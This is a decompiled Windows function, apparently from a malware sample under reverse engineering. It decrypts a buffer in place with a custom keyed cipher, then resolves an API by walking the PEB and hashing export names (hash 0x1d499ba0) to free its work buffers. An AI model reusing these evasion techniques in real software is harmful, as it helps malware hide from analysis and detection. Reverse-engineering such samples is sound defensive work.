
void FUN_00428590(byte *param_1)

{
  undefined1 *puVar1;
  uint8_t uVar2;
  char cVar3;
  byte bVar4;
  undefined1 uVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  code *pcVar9;
  undefined1 *puVar10;
  uint uVar11;
  int in_ECX;
  uint8_t *puVar12;
  byte bVar13;
  uint in_EDX;
  uint uVar14;
  uint uVar15;
  undefined1 *puVar16;
  uint uVar17;
  byte *pbVar18;
  uint uVar19;
  short *psVar20;
  int unaff_FS_OFFSET;
  undefined1 *local_48;
  undefined1 *local_44;
  undefined1 *local_40;
  undefined1 *local_3c;
  uint local_38;
  undefined1 *local_34;
  undefined1 *local_30;
  uint local_2c;
  undefined1 *local_28;
  uint local_24;
  undefined1 *local_20;
  undefined4 local_1c;
  undefined1 *local_18;
  uint local_14;
  int local_10;
  uint local_c;
  short *local_8;
  uint local_4;
  
  if ((in_ECX != 0) && (param_1 != (byte *)0x0)) {
    local_48 = (undefined1 *)0x0;
    local_40 = (undefined1 *)0x0;
    local_44 = (undefined1 *)0x0;
    local_3c = (undefined1 *)0x0;
    local_1c = 0;
    local_18 = (undefined1 *)in_EDX;
    local_8 = (short *)in_ECX;
    iVar6 = allocate_buffer_with_obfuscated_api(&local_48,&local_1c);
    if (iVar6 == 0) {
      if (local_48 != (undefined1 *)0x0) {
        puVar10 = local_48;
        for (iVar6 = 0x400; iVar6 != 0; iVar6 = iVar6 + -1) {
          *puVar10 = 0;
          puVar10 = puVar10 + 1;
        }
      }
      iVar6 = allocate_buffer_with_obfuscated_api(&local_40,&local_1c);
      if (iVar6 == 0) {
        if (local_40 != (undefined1 *)0x0) {
          puVar10 = local_40;
          for (iVar6 = 0x100; iVar6 != 0; iVar6 = iVar6 + -1) {
            *puVar10 = 0;
            puVar10 = puVar10 + 1;
          }
        }
        iVar6 = allocate_buffer_with_obfuscated_api(&local_44,&local_1c);
        if (iVar6 == 0) {
          if (local_44 != (undefined1 *)0x0) {
            puVar10 = local_44;
            for (iVar6 = 0x80; iVar6 != 0; iVar6 = iVar6 + -1) {
              *puVar10 = 0;
              puVar10 = puVar10 + 1;
            }
          }
          iVar6 = allocate_buffer_with_obfuscated_api(&local_3c,&local_1c);
          if (iVar6 == 0) {
            if (local_3c != (undefined1 *)0x0) {
              puVar10 = local_3c;
              for (iVar6 = 0x100; iVar6 != 0; iVar6 = iVar6 + -1) {
                *puVar10 = 0;
                puVar10 = puVar10 + 1;
              }
            }
            FUN_00427610(local_44,local_3c,param_1,0x80);
            local_2c = 0;
            bVar4 = param_1[0x7f] ^ param_1[0x40] ^ param_1[0x2a] ^ *param_1 ^ 0xbc;
            local_30 = (undefined1 *)0x0;
            local_14 = (uint)bVar4;
            local_24 = 0;
            local_20 = (undefined1 *)0x0;
            do {
              local_2c = local_2c + 1 & 0x800003ff;
              if ((int)local_2c < 0) {
                local_2c = (local_2c - 1 | 0xfffffc00) + 1;
              }
              bVar13 = local_48[local_2c];
              puVar10 = (undefined1 *)
                        ((byte)(&DAT_0042a010)[(uint)local_20 & 0x1f] + local_14 +
                         (uint)(byte)local_44[(uint)local_20 & 0x7f] +
                         (uint)param_1[(uint)local_20 & 0x7f] +
                         (uint)(byte)local_40[(uint)local_20 & 0xff] + (uint)bVar13 +
                         (uint)(byte)local_3c[(uint)local_20 & 0xff] + (int)local_30 & 0x800003ff);
              if ((int)puVar10 < 0) {
                puVar10 = (undefined1 *)(((int)puVar10 - 1U | 0xfffffc00) + 1);
              }
              uVar17 = (int)local_20 + 2U & 0x8000007f;
              if ((int)uVar17 < 0) {
                uVar17 = (uVar17 - 1 | 0xffffff80) + 1;
              }
              local_24 = (uint)(byte)local_48[(int)puVar10] +
                         param_1[uVar17] + local_24 +
                         ((uint)(byte)((&DAT_0042a030)[(uint)local_20 & 0x1f] ^ bVar4 ^
                                      local_3c[(uint)local_20 & 0xff]) ^ (uint)local_20) &
                         0x800003ff;
              if ((int)local_24 < 0) {
                local_24 = (local_24 - 1 | 0xfffffc00) + 1;
              }
              local_20 = (undefined1 *)((int)local_20 + 1);
              local_48[local_2c] = local_48[(int)puVar10];
              local_48[(int)puVar10] = local_48[local_24];
              local_48[local_24] = bVar13;
              local_30 = puVar10;
            } while ((int)local_20 < 0x2000);
            local_38 = 0;
            if (local_18 == (undefined1 *)0x0) {
              local_20 = local_48;
              local_30 = local_44;
              local_28 = local_40;
              local_34 = local_3c;
            }
            else {
              local_c = 0;
              local_10 = 0;
              local_4 = local_14 * 3;
              local_20 = local_48;
              local_28 = local_40;
              local_30 = local_44;
              local_34 = local_3c;
              puVar16 = local_48;
              do {
                uVar17 = local_38;
                local_2c = local_2c + 1 + (uint)(byte)puVar16[local_38 + local_2c & 0x3ff] &
                           0x800003ff;
                if ((int)local_2c < 0) {
                  local_2c = (local_2c - 1 | 0xfffffc00) + 1;
                }
                uVar14 = local_38 + (int)puVar10;
                local_30 = (undefined1 *)
                           ((uint)(byte)local_20[(int)puVar10] +
                            (uint)param_1[local_38 + local_2c & 0x7f] + (int)puVar10 +
                            (uint)(byte)local_34[uVar14 + local_2c & 0xff] +
                            (uint)(byte)local_30[uVar14 & 0x7f] +
                            (uint)(byte)(&DAT_0042a010)[uVar14 & 0x1f] +
                            (uint)(byte)local_28[local_38 + local_2c & 0xff] & 0x800003ff);
                if ((int)local_30 < 0) {
                  local_30 = (undefined1 *)(((int)local_30 - 1U | 0xfffffc00) + 1);
                }
                uVar14 = ((uint)local_30 ^ local_2c) & 0x800003ff;
                if ((int)uVar14 < 0) {
                  uVar14 = (uVar14 - 1 | 0xfffffc00) + 1;
                }
                local_24 = (uint)(byte)local_20[local_24] +
                           (byte)local_20[uVar14] + local_24 +
                           ((uint)(byte)(&DAT_0042a030)[local_38 + local_24 & 0x1f] * 7 ^ local_4 ^
                           local_38) + (uint)(byte)local_34[local_10 + local_24 & 0xff] & 0x800003ff
                ;
                if ((int)local_24 < 0) {
                  local_24 = (local_24 - 1 | 0xfffffc00) + 1;
                }
                uVar5 = local_20[local_2c];
                local_20[local_2c] = local_20[(int)local_30];
                local_48[(int)local_30] = local_48[local_24];
                local_48[local_24] = uVar5;
                local_34 = (undefined1 *)(local_38 + 6);
                cVar3 = local_48[local_2c];
                uVar14 = local_24 & 0x800000ff;
                if ((int)uVar14 < 0) {
                  uVar14 = (uVar14 - 1 | 0xffffff00) + 1;
                }
                uVar11 = (int)local_30 + local_2c & 0x8000007f;
                if ((int)uVar11 < 0) {
                  uVar11 = (uVar11 - 1 | 0xffffff80) + 1;
                }
                bVar13 = (char)((uint)(byte)local_48[(int)local_30] * 199) + local_40[uVar14] * -99
                         + cVar3 * -5 ^ local_44[uVar11] ^ param_1[local_38 + 4 & 0x7f] ^
                         local_3c[local_c & 0xff] ^ (&DAT_0042a010)[local_38 + 5 & 0x1f] ^
                         (&DAT_0042a030)[local_38 + 6 & 0x1f];
                local_28 = (undefined1 *)
                           CONCAT31((int3)((uint)(byte)local_48[(int)local_30] * 199 >> 8),bVar13);
                local_20 = (undefined1 *)(local_38 & 0xff);
                uVar14 = local_38 & 0x7f;
                local_48[local_2c] =
                     local_40[param_1[local_38 & 0x7f] + local_14 + local_38 & 0xff] +
                     local_44[uVar14] + local_3c[(int)local_20] + cVar3 + bVar13;
                puVar1 = local_48 + (int)local_30;
                uVar5 = FUN_00428220(local_48,local_40,local_44,local_3c,param_1,local_30);
                puVar10 = local_30;
                puVar16 = local_48;
                *puVar1 = uVar5;
                local_48[local_24] =
                     local_48[local_24] ^
                     local_44[uVar14] + local_3c[(int)local_20] + local_40[(int)local_20] + bVar13;
                uVar11 = uVar17 & 0x1f;
                local_40[(int)local_20] =
                     param_1[uVar17 + 5 & 0x7f] >> 3 ^ local_44[uVar14] ^ local_3c[(int)local_20] ^
                     local_48[local_2c] ^ bVar4 ^ local_40[(int)local_20] ^ (&DAT_0042a010)[uVar11];
                local_44[uVar14] =
                     local_48[(int)local_30] + local_44[uVar14] ^ param_1[uVar17 + 2 & 0x7f] ^
                     local_40[uVar17 + 4 & 0xff] ^ (&DAT_0042a030)[uVar11] ^ local_3c[(int)local_20]
                ;
                local_48[local_2c] =
                     local_48[local_2c] ^
                     local_40[local_38 + 3 & 0xff] << 5 ^ (byte)local_44[uVar17 + 4 & 0x7f] >> 2 ^
                     param_1[(uint)local_34 & 0x7f] ^ local_3c[(int)local_20] ^
                     (&DAT_0042a010)[uVar11];
                pbVar18 = (byte *)((int)local_8 + local_38);
                local_34 = local_3c;
                local_20 = local_48;
                local_30 = local_44;
                local_28 = local_40;
                bVar13 = FUN_004283e0(local_44,local_3c,local_2c,puVar10,local_24,local_38,param_1);
                *pbVar18 = *pbVar18 ^ bVar13;
                local_38 = local_38 + 1;
                local_10 = local_10 + 5;
                local_c = local_c + 7;
              } while (local_38 < local_18);
            }
            uVar17 = 0;
            if (local_18 != (undefined1 *)0x0) {
              local_4 = 2 - (int)local_8;
              do {
                pbVar18 = (byte *)(uVar17 + (int)local_8);
                uVar19 = uVar17 & 0xff;
                uVar14 = uVar17 & 0x7f;
                uVar15 = uVar17 & 0x1f;
                uVar11 = uVar17 & 0x7f;
                uVar17 = uVar17 + 1;
                *pbVar18 = *pbVar18 ^
                           param_1[(uint)(pbVar18 + local_4) & 0x7f] ^ local_30[uVar14] ^
                           param_1[uVar11] ^ (&DAT_0042a030)[uVar15] ^ (&DAT_0042a010)[uVar15] ^
                           local_34[uVar19] ^ local_28[uVar19] ^ bVar4 << 4;
              } while (uVar17 < local_18);
            }
            if (local_20 != (undefined1 *)0x0) {
              psVar20 = *(short **)
                         (*(int *)**(undefined4 **)
                                    (*(int *)(*(int *)(unaff_FS_OFFSET + 0x30) + 0xc) + 0xc) + 0x18)
              ;
              local_8 = psVar20;
              if ((((psVar20 != (short *)0x0) && (*psVar20 == 0x5a4d)) &&
                  (*(int *)(*(int *)(psVar20 + 0x1e) + (int)psVar20) == 0x4550)) &&
                 (iVar6 = *(int *)(*(int *)(psVar20 + 0x1e) + 0x78 + (int)psVar20) + (int)psVar20,
                 iVar6 != 0)) {
                uVar17 = 0;
                local_14 = *(int *)(iVar6 + 0x1c) + (int)psVar20;
                local_c = *(int *)(iVar6 + 0x20) + (int)psVar20;
                local_10 = *(int *)(iVar6 + 0x24) + (int)psVar20;
                if (*(int *)(iVar6 + 0x18) != 0) {
                  do {
                    uVar14 = 0;
                    local_4 = 0;
                    puVar12 = (uint8_t *)(*(int *)(local_c + uVar17 * 4) + (int)psVar20);
                    if (puVar12 != (uint8_t *)0x0) {
                      uVar2 = *puVar12;
                      uVar11 = uVar14;
                      while (uVar14 = uVar11, uVar2 != '\0') {
                        uVar11 = uVar14 + 1;
                        local_4 = uVar14;
                        uVar2 = puVar12[uVar14 + 1];
                      }
                    }
                    iVar8 = hasher(puVar12,uVar14);
                    if (iVar8 == 0x1d499ba0) {
                      pcVar9 = (code *)(*(int *)(local_14 +
                                                (uint)*(ushort *)(local_10 + uVar17 * 2) * 4) +
                                       (int)psVar20);
                      goto LAB_00429247;
                    }
                    uVar17 = uVar17 + 1;
                  } while (uVar17 < *(uint *)(iVar6 + 0x18));
                }
              }
              pcVar9 = (code *)0x0;
LAB_00429247:
              (*pcVar9)(local_20,0,0x8000);
              local_28 = local_40;
              local_30 = local_44;
              local_34 = local_3c;
            }
            if (local_28 != (undefined1 *)0x0) {
              psVar20 = *(short **)
                         (*(int *)**(undefined4 **)
                                    (*(int *)(*(int *)(unaff_FS_OFFSET + 0x30) + 0xc) + 0xc) + 0x18)
              ;
              local_8 = psVar20;
              if (((psVar20 != (short *)0x0) && (*psVar20 == 0x5a4d)) &&
                 ((*(int *)(*(int *)(psVar20 + 0x1e) + (int)psVar20) == 0x4550 &&
                  (iVar6 = *(int *)(*(int *)(psVar20 + 0x1e) + 0x78 + (int)psVar20) + (int)psVar20,
                  iVar6 != 0)))) {
                uVar17 = 0;
                local_14 = *(int *)(iVar6 + 0x1c) + (int)psVar20;
                local_c = *(int *)(iVar6 + 0x20) + (int)psVar20;
                local_10 = *(int *)(iVar6 + 0x24) + (int)psVar20;
                if (*(int *)(iVar6 + 0x18) != 0) {
                  do {
                    uVar14 = 0;
                    local_4 = 0;
                    puVar12 = (uint8_t *)(*(int *)(local_c + uVar17 * 4) + (int)psVar20);
                    if (puVar12 != (uint8_t *)0x0) {
                      uVar2 = *puVar12;
                      uVar11 = uVar14;
                      while (uVar14 = uVar11, uVar2 != '\0') {
                        uVar11 = uVar14 + 1;
                        local_4 = uVar14;
                        uVar2 = puVar12[uVar14 + 1];
                      }
                    }
                    iVar8 = hasher(puVar12,uVar14);
                    if (iVar8 == 0x1d499ba0) {
                      pcVar9 = (code *)(*(int *)(local_14 +
                                                (uint)*(ushort *)(local_10 + uVar17 * 2) * 4) +
                                       (int)psVar20);
                      goto LAB_0042932b;
                    }
                    uVar17 = uVar17 + 1;
                  } while (uVar17 < *(uint *)(iVar6 + 0x18));
                }
              }
              pcVar9 = (code *)0x0;
LAB_0042932b:
              (*pcVar9)(local_28,0,0x8000);
              local_30 = local_44;
              local_34 = local_3c;
            }
            if (local_30 != (undefined1 *)0x0) {
              psVar20 = *(short **)
                         (*(int *)**(undefined4 **)
                                    (*(int *)(*(int *)(unaff_FS_OFFSET + 0x30) + 0xc) + 0xc) + 0x18)
              ;
              local_8 = psVar20;
              if (((psVar20 != (short *)0x0) && (*psVar20 == 0x5a4d)) &&
                 ((*(int *)(*(int *)(psVar20 + 0x1e) + (int)psVar20) == 0x4550 &&
                  (iVar6 = *(int *)(*(int *)(psVar20 + 0x1e) + 0x78 + (int)psVar20) + (int)psVar20,
                  iVar6 != 0)))) {
                uVar17 = 0;
                local_14 = *(int *)(iVar6 + 0x1c) + (int)psVar20;
                local_c = *(int *)(iVar6 + 0x20) + (int)psVar20;
                local_10 = *(int *)(iVar6 + 0x24) + (int)psVar20;
                if (*(int *)(iVar6 + 0x18) != 0) {
                  do {
                    uVar14 = 0;
                    local_4 = 0;
                    puVar12 = (uint8_t *)(*(int *)(local_c + uVar17 * 4) + (int)psVar20);
                    if (puVar12 != (uint8_t *)0x0) {
                      uVar2 = *puVar12;
                      uVar11 = uVar14;
                      while (uVar14 = uVar11, uVar2 != '\0') {
                        uVar11 = uVar14 + 1;
                        local_4 = uVar14;
                        uVar2 = puVar12[uVar14 + 1];
                      }
                    }
                    iVar8 = hasher(puVar12,uVar14);
                    if (iVar8 == 0x1d499ba0) {
                      pcVar9 = (code *)(*(int *)(local_14 +
                                                (uint)*(ushort *)(local_10 + uVar17 * 2) * 4) +
                                       (int)psVar20);
                      goto LAB_00429417;
                    }
                    uVar17 = uVar17 + 1;
                  } while (uVar17 < *(uint *)(iVar6 + 0x18));
                }
              }
              pcVar9 = (code *)0x0;
LAB_00429417:
              (*pcVar9)(local_30,0,0x8000);
              local_34 = local_3c;
            }
            if (local_34 != (undefined1 *)0x0) {
              psVar20 = *(short **)
                         (*(int *)**(undefined4 **)
                                    (*(int *)(*(int *)(unaff_FS_OFFSET + 0x30) + 0xc) + 0xc) + 0x18)
              ;
              local_8 = psVar20;
              if ((((psVar20 != (short *)0x0) && (*psVar20 == 0x5a4d)) &&
                  (*(int *)(*(int *)(psVar20 + 0x1e) + (int)psVar20) == 0x4550)) &&
                 (iVar6 = *(int *)(*(int *)(psVar20 + 0x1e) + 0x78 + (int)psVar20) + (int)psVar20,
                 iVar6 != 0)) {
                uVar17 = 0;
                iVar8 = *(int *)(iVar6 + 0x20);
                local_10 = *(int *)(iVar6 + 0x1c) + (int)psVar20;
                local_c = *(int *)(iVar6 + 0x24) + (int)psVar20;
                if (*(int *)(iVar6 + 0x18) != 0) {
                  do {
                    uVar14 = 0;
                    local_4 = 0;
                    puVar12 = (uint8_t *)
                              (*(int *)((int)psVar20 + uVar17 * 4 + iVar8) + (int)psVar20);
                    if (puVar12 != (uint8_t *)0x0) {
                      uVar2 = *puVar12;
                      uVar11 = uVar14;
                      while (uVar14 = uVar11, uVar2 != '\0') {
                        uVar11 = uVar14 + 1;
                        local_4 = uVar14;
                        uVar2 = puVar12[uVar14 + 1];
                      }
                    }
                    iVar7 = hasher(puVar12,uVar14);
                    if (iVar7 == 0x1d499ba0) {
                      (*(code *)(*(int *)(local_10 + (uint)*(ushort *)(local_c + uVar17 * 2) * 4) +
                                (int)psVar20))(local_34,0,0x8000);
                      return;
                    }
                    uVar17 = uVar17 + 1;
                  } while (uVar17 < *(uint *)(iVar6 + 0x18));
                }
              }
              (*(code *)0x0)(local_34,0,0x8000);
            }
          }
          else {
            local_20 = local_48;
            if (local_48 != (undefined1 *)0x0) {
              psVar20 = *(short **)
                         (*(int *)**(undefined4 **)
                                    (*(int *)(*(int *)(unaff_FS_OFFSET + 0x30) + 0xc) + 0xc) + 0x18)
              ;
              local_8 = psVar20;
              if (((psVar20 != (short *)0x0) && (*psVar20 == 0x5a4d)) &&
                 ((*(int *)(*(int *)(psVar20 + 0x1e) + (int)psVar20) == 0x4550 &&
                  (iVar6 = *(int *)(*(int *)(psVar20 + 0x1e) + 0x78 + (int)psVar20) + (int)psVar20,
                  iVar6 != 0)))) {
                uVar17 = 0;
                local_18 = (undefined1 *)(*(int *)(iVar6 + 0x1c) + (int)psVar20);
                local_10 = *(int *)(iVar6 + 0x20) + (int)psVar20;
                local_14 = *(int *)(iVar6 + 0x24) + (int)psVar20;
                if (*(int *)(iVar6 + 0x18) != 0) {
                  do {
                    uVar14 = 0;
                    local_c = 0;
                    puVar12 = (uint8_t *)(*(int *)(local_10 + uVar17 * 4) + (int)psVar20);
                    if (puVar12 != (uint8_t *)0x0) {
                      uVar2 = *puVar12;
                      uVar11 = uVar14;
                      while (uVar14 = uVar11, uVar2 != '\0') {
                        uVar11 = uVar14 + 1;
                        local_c = uVar14;
                        uVar2 = puVar12[uVar14 + 1];
                      }
                    }
                    iVar8 = hasher(puVar12,uVar14);
                    if (iVar8 == 0x1d499ba0) {
                      pcVar9 = (code *)(*(int *)((int)local_18 +
                                                (uint)*(ushort *)(local_14 + uVar17 * 2) * 4) +
                                       (int)psVar20);
                      goto LAB_004289dd;
                    }
                    uVar17 = uVar17 + 1;
                  } while (uVar17 < *(uint *)(iVar6 + 0x18));
                }
              }
              pcVar9 = (code *)0x0;
LAB_004289dd:
              (*pcVar9)(local_20,0,0x8000);
            }
            local_20 = local_40;
            if (local_40 != (undefined1 *)0x0) {
              psVar20 = *(short **)
                         (*(int *)**(undefined4 **)
                                    (*(int *)(*(int *)(unaff_FS_OFFSET + 0x30) + 0xc) + 0xc) + 0x18)
              ;
              local_8 = psVar20;
              if (((psVar20 != (short *)0x0) && (*psVar20 == 0x5a4d)) &&
                 ((*(int *)(*(int *)(psVar20 + 0x1e) + (int)psVar20) == 0x4550 &&
                  (iVar6 = *(int *)(*(int *)(psVar20 + 0x1e) + 0x78 + (int)psVar20) + (int)psVar20,
                  iVar6 != 0)))) {
                uVar17 = 0;
                local_18 = (undefined1 *)(*(int *)(iVar6 + 0x1c) + (int)psVar20);
                local_10 = *(int *)(iVar6 + 0x20) + (int)psVar20;
                local_14 = *(int *)(iVar6 + 0x24) + (int)psVar20;
                if (*(int *)(iVar6 + 0x18) != 0) {
                  do {
                    uVar14 = 0;
                    local_c = 0;
                    puVar12 = (uint8_t *)(*(int *)(local_10 + uVar17 * 4) + (int)psVar20);
                    if (puVar12 != (uint8_t *)0x0) {
                      uVar2 = *puVar12;
                      uVar11 = uVar14;
                      while (uVar14 = uVar11, uVar2 != '\0') {
                        uVar11 = uVar14 + 1;
                        local_c = uVar14;
                        uVar2 = puVar12[uVar14 + 1];
                      }
                    }
                    iVar8 = hasher(puVar12,uVar14);
                    if (iVar8 == 0x1d499ba0) {
                      pcVar9 = (code *)(*(int *)((int)local_18 +
                                                (uint)*(ushort *)(local_14 + uVar17 * 2) * 4) +
                                       (int)psVar20);
                      goto LAB_00428ac7;
                    }
                    uVar17 = uVar17 + 1;
                  } while (uVar17 < *(uint *)(iVar6 + 0x18));
                }
              }
              pcVar9 = (code *)0x0;
LAB_00428ac7:
              (*pcVar9)(local_20,0,0x8000);
            }
            local_18 = local_44;
            if (local_44 != (undefined1 *)0x0) {
              psVar20 = *(short **)
                         (*(int *)**(undefined4 **)
                                    (*(int *)(*(int *)(unaff_FS_OFFSET + 0x30) + 0xc) + 0xc) + 0x18)
              ;
              local_8 = psVar20;
              if ((((psVar20 != (short *)0x0) && (*psVar20 == 0x5a4d)) &&
                  (*(int *)(*(int *)(psVar20 + 0x1e) + (int)psVar20) == 0x4550)) &&
                 (iVar6 = *(int *)(*(int *)(psVar20 + 0x1e) + 0x78 + (int)psVar20) + (int)psVar20,
                 iVar6 != 0)) {
                uVar17 = 0;
                iVar8 = *(int *)(iVar6 + 0x20);
                local_14 = *(int *)(iVar6 + 0x1c) + (int)psVar20;
                local_10 = *(int *)(iVar6 + 0x24) + (int)psVar20;
                if (*(int *)(iVar6 + 0x18) != 0) {
                  do {
                    uVar14 = 0;
                    local_c = 0;
                    puVar12 = (uint8_t *)
                              (*(int *)((int)psVar20 + uVar17 * 4 + iVar8) + (int)psVar20);
                    if (puVar12 != (uint8_t *)0x0) {
                      uVar2 = *puVar12;
                      uVar11 = uVar14;
                      while (uVar14 = uVar11, uVar2 != '\0') {
                        uVar11 = uVar14 + 1;
                        local_c = uVar14;
                        uVar2 = puVar12[uVar14 + 1];
                      }
                    }
                    iVar7 = hasher(puVar12,uVar14);
                    if (iVar7 == 0x1d499ba0) goto LAB_004286f8;
                    uVar17 = uVar17 + 1;
                  } while (uVar17 < *(uint *)(iVar6 + 0x18));
                }
              }
              goto LAB_004286e2;
            }
          }
        }
        else {
          local_20 = local_48;
          if (local_48 != (undefined1 *)0x0) {
            psVar20 = *(short **)
                       (*(int *)**(undefined4 **)
                                  (*(int *)(*(int *)(unaff_FS_OFFSET + 0x30) + 0xc) + 0xc) + 0x18);
            local_8 = psVar20;
            if (((psVar20 != (short *)0x0) && (*psVar20 == 0x5a4d)) &&
               ((*(int *)(*(int *)(psVar20 + 0x1e) + (int)psVar20) == 0x4550 &&
                (iVar6 = *(int *)(*(int *)(psVar20 + 0x1e) + 0x78 + (int)psVar20) + (int)psVar20,
                iVar6 != 0)))) {
              uVar17 = 0;
              local_18 = (undefined1 *)(*(int *)(iVar6 + 0x1c) + (int)psVar20);
              local_10 = *(int *)(iVar6 + 0x20) + (int)psVar20;
              local_14 = *(int *)(iVar6 + 0x24) + (int)psVar20;
              if (*(int *)(iVar6 + 0x18) != 0) {
                do {
                  uVar14 = 0;
                  local_c = 0;
                  puVar12 = (uint8_t *)(*(int *)(local_10 + uVar17 * 4) + (int)psVar20);
                  if (puVar12 != (uint8_t *)0x0) {
                    uVar2 = *puVar12;
                    uVar11 = uVar14;
                    while (uVar14 = uVar11, uVar2 != '\0') {
                      uVar11 = uVar14 + 1;
                      local_c = uVar14;
                      uVar2 = puVar12[uVar14 + 1];
                    }
                  }
                  iVar8 = hasher(puVar12,uVar14);
                  if (iVar8 == 0x1d499ba0) {
                    pcVar9 = (code *)(*(int *)((int)local_18 +
                                              (uint)*(ushort *)(local_14 + uVar17 * 2) * 4) +
                                     (int)psVar20);
                    goto LAB_0042880b;
                  }
                  uVar17 = uVar17 + 1;
                } while (uVar17 < *(uint *)(iVar6 + 0x18));
              }
            }
            pcVar9 = (code *)0x0;
LAB_0042880b:
            (*pcVar9)(local_20,0,0x8000);
          }
          local_18 = local_40;
          if (local_40 != (undefined1 *)0x0) {
            psVar20 = *(short **)
                       (*(int *)**(undefined4 **)
                                  (*(int *)(*(int *)(unaff_FS_OFFSET + 0x30) + 0xc) + 0xc) + 0x18);
            local_8 = psVar20;
            if (((psVar20 != (short *)0x0) && (*psVar20 == 0x5a4d)) &&
               ((*(int *)(*(int *)(psVar20 + 0x1e) + (int)psVar20) == 0x4550 &&
                (iVar6 = *(int *)(*(int *)(psVar20 + 0x1e) + 0x78 + (int)psVar20) + (int)psVar20,
                iVar6 != 0)))) {
              uVar17 = 0;
              iVar8 = *(int *)(iVar6 + 0x20);
              local_14 = *(int *)(iVar6 + 0x1c) + (int)psVar20;
              local_10 = *(int *)(iVar6 + 0x24) + (int)psVar20;
              if (*(int *)(iVar6 + 0x18) != 0) {
                do {
                  uVar14 = 0;
                  local_c = 0;
                  puVar12 = (uint8_t *)(*(int *)((int)psVar20 + uVar17 * 4 + iVar8) + (int)psVar20);
                  if (puVar12 != (uint8_t *)0x0) {
                    uVar2 = *puVar12;
                    uVar11 = uVar14;
                    while (uVar14 = uVar11, uVar2 != '\0') {
                      uVar11 = uVar14 + 1;
                      local_c = uVar14;
                      uVar2 = puVar12[uVar14 + 1];
                    }
                  }
                  iVar7 = hasher(puVar12,uVar14);
                  if (iVar7 == 0x1d499ba0) goto LAB_004286f8;
                  uVar17 = uVar17 + 1;
                } while (uVar17 < *(uint *)(iVar6 + 0x18));
              }
            }
            goto LAB_004286e2;
          }
        }
      }
      else {
        local_18 = local_48;
        if (local_48 != (undefined1 *)0x0) {
          psVar20 = *(short **)
                     (*(int *)**(undefined4 **)
                                (*(int *)(*(int *)(unaff_FS_OFFSET + 0x30) + 0xc) + 0xc) + 0x18);
          local_8 = psVar20;
          if ((((psVar20 != (short *)0x0) && (*psVar20 == 0x5a4d)) &&
              (*(int *)(*(int *)(psVar20 + 0x1e) + (int)psVar20) == 0x4550)) &&
             (iVar6 = *(int *)(*(int *)(psVar20 + 0x1e) + 0x78 + (int)psVar20) + (int)psVar20,
             iVar6 != 0)) {
            uVar17 = 0;
            iVar8 = *(int *)(iVar6 + 0x20);
            local_14 = *(int *)(iVar6 + 0x1c) + (int)psVar20;
            local_10 = *(int *)(iVar6 + 0x24) + (int)psVar20;
            if (*(int *)(iVar6 + 0x18) != 0) {
              do {
                uVar14 = 0;
                local_c = 0;
                puVar12 = (uint8_t *)(*(int *)((int)psVar20 + uVar17 * 4 + iVar8) + (int)psVar20);
                if (puVar12 != (uint8_t *)0x0) {
                  uVar2 = *puVar12;
                  uVar11 = uVar14;
                  while (uVar14 = uVar11, uVar2 != '\0') {
                    uVar11 = uVar14 + 1;
                    local_c = uVar14;
                    uVar2 = puVar12[uVar14 + 1];
                  }
                }
                iVar7 = hasher(puVar12,uVar14);
                if (iVar7 == 0x1d499ba0) {
LAB_004286f8:
                  (*(code *)(*(int *)(local_14 + (uint)*(ushort *)(local_10 + uVar17 * 2) * 4) +
                            (int)psVar20))(local_18,0,0x8000);
                  return;
                }
                uVar17 = uVar17 + 1;
              } while (uVar17 < *(uint *)(iVar6 + 0x18));
            }
          }
LAB_004286e2:
          (*(code *)0x0)(local_18,0,0x8000);
          return;
        }
      }
    }
  }
  return;
}

